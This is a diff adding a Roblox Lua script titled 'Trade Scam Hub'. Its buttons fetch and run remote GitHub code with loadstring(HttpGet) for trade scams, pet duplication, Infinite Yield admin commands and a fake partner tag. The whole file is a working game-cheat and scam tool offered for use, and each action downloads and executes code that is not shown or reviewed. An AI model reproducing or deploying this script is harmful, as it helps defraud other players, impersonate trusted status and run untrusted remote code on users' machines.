@@ -1,0 +1,37 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Trade Scam Hub", "BloodTheme")
+
+--MAIN
+local Main = Window:NewTab("Trade Scam")
+local MainSection = Main:NewSection("Main")
+
+
+MainSection:NewButton("Trade Scam", "Toggle On And Off In Trade Then Take Pets Out.", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxDupeOp/DupeMethodOp/main/DupeMethodLeaked.lua"))()
+end)
+
+MainSection:NewToggle("Dupe Method", "Toggle On Then Withdraw Huges From Bank", function(state)
+    if state then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxDupeOp/DupeScriptPSX/main/PsxDupe.lua"))()    else
+        print("Toggle Off")
+
+    end
+end)
+
+--ADMIN
+local Main = Window:NewTab("Admin")
+local MainSection = Main:NewSection("Admin")
+
+MainSection:NewButton("Infinite Yield", "FE Admin Commands", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+
+
+
+--PARTNER TAG
+local Main = Window:NewTab("Partner Tag")
+local MainSection = Main:NewSection("Fake Partner Tag")
+
+MainSection:NewButton("Fake Partner Tag", "Fake Partner Tag Script", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIlllI/PartnerPSX/main/BetterPartnerTag'))()
+end)
